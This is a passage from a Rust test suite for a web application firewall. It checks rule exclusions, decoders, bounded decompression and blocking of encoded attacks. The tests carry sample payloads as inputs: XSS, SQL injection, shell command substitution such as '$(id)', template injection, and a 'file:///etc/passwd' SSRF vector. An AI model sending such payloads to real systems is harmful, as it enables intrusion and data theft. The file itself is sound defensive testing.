        let elsewhere = engine.inspect(&WafRequest {
            method: "POST",
            path: "/api/users",
            query,
            headers: &headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(
            blocked(&elsewhere),
            "the exclusion must not apply to other paths"
        );
    }

    #[test]
    fn exclusions_can_suppress_a_whole_category() {
        let mut cfg = config();
        cfg.exclusions = vec![WafExclusion {
            path: "^/regex/".to_string(),
            rules: Vec::new(),
            categories: vec!["xss".to_string()],
        }];
        let engine = WafEngine::new(&cfg);
        let headers = browser_headers();
        let v = engine.inspect(&WafRequest {
            method: "GET",
            path: "/regex/tester",
            query: "pattern=<script>",
            headers: &headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(
            matches!(v, WafVerdict::Allow),
            "the xss category must be suppressed on this path, got {}",
            rule_of(&v)
        );
    }

    /// Rules used to be named by the first 40 characters of their own regex, so
    /// every log line moved when a pattern was edited.
    #[test]
    fn verdicts_carry_a_stable_rule_identifier() {
        let mut headers = HeaderMap::new();
        headers.insert("user-agent", "sqlmap/1.7".parse().unwrap());
        let v = engine().inspect(&req("GET", "/", &headers));
        assert_eq!(rule_of(&v), "bad-bot-ua:PQW-BOT-001");
    }

    #[test]
    fn counters_track_verdicts_and_rules() {
        let engine = engine();
        let mut headers = HeaderMap::new();
        headers.insert("user-agent", "sqlmap/1.7".parse().unwrap());
        engine.inspect(&req("GET", "/", &headers));
        engine.inspect(&req("GET", "/", &browser_headers()));

        let stats = engine.stats();
        assert_eq!(stats.inspected, 2);
        assert_eq!(stats.blocked, 1);
        assert_eq!(stats.allowed, 1);
        let hit = stats
            .rules
            .iter()
            .find(|r| r.id == "PQW-BOT-001")
            .expect("the matched rule must appear in the snapshot");
        assert_eq!(hit.hits, 1);
        assert_eq!(hit.category, "bad-bot-ua");
        assert!(
            stats.rules.iter().all(|r| r.hits > 0),
            "rules that never matched must be omitted from the snapshot"
        );
    }

    /// A disabled category keeps its metadata slot so rule indices — and
    /// therefore metric series — stay stable across a config change.
    #[test]
    fn disabling_a_category_does_not_renumber_rules() {
        let mut cfg = config();
        cfg.sqli = false;
        assert_eq!(
            WafEngine::new(&cfg).rule_count(),
            engine().rule_count(),
            "rule indices must not shift when a category is switched off"
        );
    }

    #[test]
    fn disabled_category_stops_matching() {
        let mut cfg = config();
        cfg.xss = false;
        let engine = WafEngine::new(&cfg);
        let headers = browser_headers();
        let v = engine.inspect(&WafRequest {
            method: "GET",
            path: "/search",
            query: "q=<script>alert(1)</script>",
            headers: &headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(
            matches!(v, WafVerdict::Allow),
            "xss=false must disable the category"
        );
    }

    // ------------------------------------------------------------------
    // Decoder units
    // ------------------------------------------------------------------

    #[test]
    fn percent_decoding_stops_at_a_fixpoint() {
        assert_eq!(percent_decode_iterative("%2527", 3), "'");
        assert_eq!(percent_decode_iterative("plain", 3), "plain");
        // Bounded: one more layer than the budget stays encoded rather than
        // looping forever on a decoding bomb.
        assert_eq!(percent_decode_iterative("%25252527", 2), "%2527");
    }

    #[test]
    fn entity_and_json_decoders_round_trip() {
        assert_eq!(html_entity_decode("&#x3c;a&#62;&amp;"), "<a>&");
        assert_eq!(html_entity_decode("plain & simple"), "plain & simple");
        assert_eq!(json_unescape(r"\u003cb\u003e"), "<b>");
        // Surrogate pair — a lone half must not be mistaken for a character.
        assert_eq!(json_unescape(r"\ud83d\ude00"), "\u{1f600}");
        assert_eq!(json_unescape(r"no escapes here"), "no escapes here");
    }

    #[test]
    fn truncation_never_splits_a_character() {
        let s = "aa€bb";
        for max in 0..=s.len() {
            let t = truncate_on_char_boundary(s, max);
            assert!(t.len() <= max || max > s.len());
            assert!(s.starts_with(t));
        }
    }

    // ------------------------------------------------------------------
    // Gaps closed after the black-box pentest run
    // ------------------------------------------------------------------

    /// `$(id)` in a parameter passed inspection because bare `$(...)` is Low
    /// (it appears in shell docs). A substitution wrapping a known command is
    /// not ambiguous and must block.
    #[test]
    fn command_substitution_of_a_known_command_is_blocked() {
        let headers = browser_headers();
        for q in ["cmd=$(id)", "cmd=`whoami`", "x=${cat}", "y=$( uname -a )"] {
            let v = engine().inspect(&WafRequest {
                method: "GET",
                path: "/run",
                query: q,
                headers: &headers,
                body: None,
                skip_bot_ua_check: false,
                mode_override: None,
            });
            assert!(blocked(&v), "command substitution {q:?} must block");
        }
    }

    /// PHP/Smarty/Twig template injection the Jinja-oriented rules missed.
    #[test]
    fn php_family_template_injection_is_blocked() {
        let headers = browser_headers();
        for q in [
            "t={php}echo 7*7;{/php}",
            "t={$smarty.version}",
            "t={{dump(app)}}",
            "t={/if}",
        ] {
            let v = engine().inspect(&WafRequest {
                method: "GET",
                path: "/tpl",
                query: q,
                headers: &headers,
                body: None,
                skip_bot_ua_check: false,
                mode_override: None,
            });
            assert!(blocked(&v), "PHP-family SSTI {q:?} must block");
        }
    }

    /// Fullwidth `<script>` (U+FF1C/FF1E) is folded to ASCII before matching.
    #[test]
    fn fullwidth_xss_is_folded_and_blocked() {
        let headers = browser_headers();
        // %EF%BC%9C = U+FF1C, %EF%BC%9E = U+FF1E.
        let v = engine().inspect(&WafRequest {
            method: "GET",
            path: "/s",
            query: "q=%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E",
            headers: &headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(blocked(&v), "fullwidth-encoded XSS must block");
    }

    /// IIS-style `%uXXXX` escapes are decoded before matching.
    #[test]
    fn percent_u_encoded_xss_is_blocked() {
        let headers = browser_headers();
        let v = engine().inspect(&WafRequest {
            method: "GET",
            path: "/s",
            query: "q=%u003cscript%u003ealert(1)%u003c/script%u003e",
            headers: &headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(blocked(&v), "%u-encoded XSS must block");
    }

    #[test]
    fn decoder_units_for_new_forms() {
        assert_eq!(percent_u_decode("%u003cb%u003e"), "<b>");
        assert_eq!(percent_u_decode("plain"), "plain");
        assert_eq!(fold_fullwidth("\u{ff1c}script\u{ff1e}"), "<script>");
        assert_eq!(fold_fullwidth("ascii"), "ascii");
    }

    /// A gzip'd request body carrying an attack must be decompressed and
    /// blocked. Compressed, the raw bytes are entropy and match nothing — the
    /// bypass this closes.
    #[test]
    fn gzip_encoded_body_attack_is_decompressed_and_blocked() {
        use std::io::Write;
        let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        enc.write_all(br#"{"q":"<script>alert(1)</script>"}"#)
            .unwrap();
        let gz = enc.finish().unwrap();

        let mut headers = browser_headers();
        headers.insert("content-encoding", "gzip".parse().unwrap());
        headers.insert("content-type", "application/json".parse().unwrap());
        let v = engine().inspect(&WafRequest {
            method: "POST",
            path: "/api/x",
            query: "",
            headers: &headers,
            body: Some(&gz),
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(
            blocked(&v),
            "gzip'd XSS body must be decompressed and blocked"
        );
        assert!(
            rule_of(&v).starts_with("xss:"),
            "must block via an XSS rule (proof of decompression), not raw-stream byte noise; got {}",
            rule_of(&v)
        );
    }

    /// deflate (zlib) encoding path.
    #[test]
    fn deflate_encoded_body_attack_is_blocked() {
        use std::io::Write;
        let mut enc = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::default());
        enc.write_all(b"id=1' OR 1=1--").unwrap();
        let z = enc.finish().unwrap();
        let mut headers = browser_headers();
        headers.insert("content-encoding", "deflate".parse().unwrap());
        let v = engine().inspect(&WafRequest {
            method: "POST",
            path: "/api/x",
            query: "",
            headers: &headers,
            body: Some(&z),
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(blocked(&v), "deflate'd SQLi body must be blocked");
    }

    /// A benign gzip'd body must still pass once decompressed — decompression
    /// must not turn ordinary compressed traffic into a false positive.
    #[test]
    fn gzip_encoded_benign_body_is_allowed() {
        use std::io::Write;
        let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        enc.write_all(br#"{"name":"alice","tier":2,"note":"hello world"}"#)
            .unwrap();
        let gz = enc.finish().unwrap();
        let mut headers = browser_headers();
        headers.insert("content-encoding", "gzip".parse().unwrap());
        headers.insert("content-type", "application/json".parse().unwrap());
        let v = engine().inspect(&WafRequest {
            method: "POST",
            path: "/api/x",
            query: "",
            headers: &headers,
            body: Some(&gz),
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(
            matches!(v, WafVerdict::Allow),
            "benign gzip body must pass, got {}",
            rule_of(&v)
        );
    }

    /// A compression bomb must not exhaust memory: decompression is capped, and
    /// whatever fits in the cap is still scanned (so a payload in the first
    /// megabyte is caught, and a bomb is truncated rather than expanded whole).
    #[test]
    fn decompression_is_bounded() {
        // 8 MiB of 'A' compresses tiny; cap the scan at 64 KiB.
        use std::io::Write;
        let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        enc.write_all(&vec![b'A'; 8 * 1024 * 1024]).unwrap();
        let gz = enc.finish().unwrap();
        let out = decompress_bounded(&gz, "gzip", 64 * 1024);
        let out = out.expect("bounded decode should return the capped prefix");
        assert!(
            out.len() <= 64 * 1024,
            "output must be capped, got {}",
            out.len()
        );
    }

    #[test]
    fn decompress_bounded_handles_gzip_cli_output() {
        // Bytes identical to what the `gzip` CLI emits (has FNAME=0, OS byte).
        use std::io::Write;
        let mut enc = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        enc.write_all(br#"{"name":"alice"}"#).unwrap();
        let gz = enc.finish().unwrap();
        let out = decompress_bounded(&gz, "gzip", 1024).expect("gzip must decode");
        assert_eq!(out, br#"{"name":"alice"}"#);
    }

    #[test]
    fn decompress_bounded_rejects_unknown_encoding() {
        assert!(decompress_bounded(b"whatever", "identity", 1024).is_none());
        assert!(decompress_bounded(b"whatever", "", 1024).is_none());
    }

    /// A fullwidth query that is not an attack must still pass — the fold must
    /// not turn ordinary wide-character text into a false positive.
    /// Two bare loopback spellings in prose must not corroborate into a block:
    /// they are Info-severity, so even together they stay under the threshold.
    /// The regression corpus caught this — a doc string naming both `localhost`
    /// and `127.0.0.1` was a 403.
    #[test]
    fn multiple_loopback_mentions_in_prose_do_not_block() {
        let mut cfg = config();
        cfg.ssrf = true;
        let engine = WafEngine::new(&cfg);
        let headers = browser_headers();
        let v = engine.inspect(&WafRequest {
            method: "GET",
            path: "/docs",
            query: "example=connect to localhost first then 127.0.0.1 and [::1]",
            headers: &headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(
            matches!(v, WafVerdict::Allow),
            "bare loopback mentions must not self-corroborate into a block, got {}",
            rule_of(&v)
        );
    }

    /// A loopback mention DOES contribute once there is a real fetch vector:
    /// `file://` is High, so `file:///…` next to `localhost` blocks.
    #[test]
    fn loopback_with_a_real_ssrf_vector_blocks() {
        let mut cfg = config();
        cfg.ssrf = true;
        let engine = WafEngine::new(&cfg);
        let headers = browser_headers();
        let v = engine.inspect(&WafRequest {
            method: "GET",
            path: "/fetch",
            query: "url=file:///etc/passwd",
            headers: &headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(blocked(&v), "a file:// SSRF vector must block");
    }

    #[test]
    fn fullwidth_non_attack_text_is_allowed() {
        let headers = browser_headers();
        let v = engine().inspect(&WafRequest {
            method: "GET",
            path: "/s",
            // Fullwidth "ABC123" — folds to ASCII "ABC123", matches no rule.
            query: "q=%EF%BC%A1%EF%BC%A2%EF%BC%A3",
            headers: &headers,
            body: None,
            skip_bot_ua_check: false,
            mode_override: None,
        });
        assert!(
            matches!(v, WafVerdict::Allow),
            "benign fullwidth text must pass, got {}",
            rule_of(&v)
        );
    }
}
